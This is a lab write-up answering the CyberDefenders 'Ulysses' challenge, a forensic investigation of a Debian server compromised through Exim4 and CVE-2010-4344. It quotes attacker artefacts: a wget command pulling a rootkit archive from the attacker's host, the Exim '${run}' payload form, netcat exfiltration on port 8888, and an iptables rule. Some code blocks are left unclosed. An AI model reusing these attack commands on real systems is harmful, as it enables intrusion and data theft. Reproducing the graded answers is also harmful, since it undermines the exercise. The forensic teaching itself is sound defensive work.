# 🛡️ Lab Writeup: Ulysses (Memory & Disk Forensics)

![Platform](https://img.shields.io/badge/Platform-CyberDefenders-blue)
![Category](https://img.shields.io/badge/Category-Memory%20%26%20Disk%20Forensics-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)

## 📌 Lab Overview
The **Ulysses** scenario involves investigating a compromised Linux server running an outdated Exim4 mail transfer agent. By combining disk image analysis with memory forensics using **Volatility**, this investigation traces the full attack lifecycle: initial reconnaissance, remote code execution (RCE), privilege escalation, rootkit persistence, data exfiltration, and firewall manipulation.

---

## 📊 Investigation Summary & Answers

### Q1: The attacker was performing a brute force attack. What account triggered the alert?
* **Answer:** `ulysses`
* **Methodology:** Inspected `/var/log/auth.log` on the mounted disk image (`/mnt/ulysses/var/log/auth.log`) to identify repeated SSH authentication failures targeting a specific username.

---

### Q2: During investigating the logs, how many failed login attempts were alerted by the same user?
* **Answer:** `32`
* **Methodology:** Filtered `/var/log/auth.log` for failed password attempts corresponding to user `ulysses`:
  ```bash
  grep "Failed password for ulysses" /var/log/auth.log | wc -l

  ### Q3: What kind of system runs on the targeted server?
* **Answer:** `Debian GNU/Linux 5.0`
* **Methodology:** Verified via system release files (`/etc/issue` or `/etc/debian_version`) on disk, as well as Volatility image profiling identification (`LinuxDebian5_26x86`).

---

### Q4: What is the victim's IP address?
* **Answer:** `192.168.56.102`
* **Methodology:** Checked network configuration files (`/etc/network/interfaces`) and verified active network interface structures in memory via Volatility `linux_netstat`.

---

### Q5: What are the attacker's two IP addresses?
* **Answer:** `192.168.56.1,192.168.56.101`
* **Methodology:** Correlated incoming Exim service logs (`mainlog`) and active TCP socket connections in memory. The attacker executed staging and payloads across both source IPs.

---

### Q6: What is the `nc` service PID number that was running on the server?
* **Answer:** `2189`
* **Methodology:** Executed Volatility's process listing plugin against the memory image to locate the active `nc` (Netcat) process:
  ```bash
  python2 vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_pslist | grep nc

  ### Q7: What service was exploited to gain access to the system?
* **Answer:** `Exim4`
* **Methodology:** Log analysis of `/var/log/exim4/mainlog` revealed crafted string expansion payloads (`${run{...}}`) delivered via SMTP commands.

---

### Q8: What is the CVE number of the exploited vulnerability?
* **Answer:** `CVE-2010-4344`
* **Methodology:** Identified the Exim4 Heap Buffer Overflow vulnerability allowing arbitrary command execution via ACL string expansion (`${run}`).

---

### Q9: During this attack, the attacker downloaded two files to the server. Provide the name of the compressed file.
* **Answer:** `rk.tar`
* **Methodology:** Analyzed the `wget` payloads embedded inside the Exim log files and checked `/tmp/` directory artifacts on disk:
  ```bash
  wget [http://192.168.56.1/rk.tar](http://192.168.56.1/rk.tar) -O /tmp/rk.tar
  ### Q10: During the investigation, two ports were involved in the process of data exfiltration. Which port did the `nc` command use for the exfiltration?
* **Answer:** `8888`
* **Methodology:** Correlated netcat process memory arguments and active memory connections (`linux_netstat` / process command-line strings) used during the data transfer session.

---

### Q11: Which port did the attacker try to block on the firewall?
* **Answer:** `45295`
* **Methodology:** Extracted and analyzed the unpacked rootkit installer script (`/tmp/rk/install.sh`) and memory string buffers containing the `iptables` drop rule execution:
  ```bash
  iptables -A INPUT -p tcp --dport 45295 -j DROP
  ## 🛠️ Key Takeaways & SOC Detection Opportunities

1. **Exim String Expansion Monitoring:** Enable logging for string expansion evaluations in Exim mail servers to catch anomalous `${run{...}}` constructs.
2. **Volatile Memory Verification:** Attacks utilizing ephemeral staging (like `wget` directly piped to execution or memory-only sockets) require RAM analysis to accurately identify active exfiltration ports.
3. **Host Firewall Anomalies:** Monitor for unexpected execution of `iptables` or local firewall modifications originated by non-administrative service users.
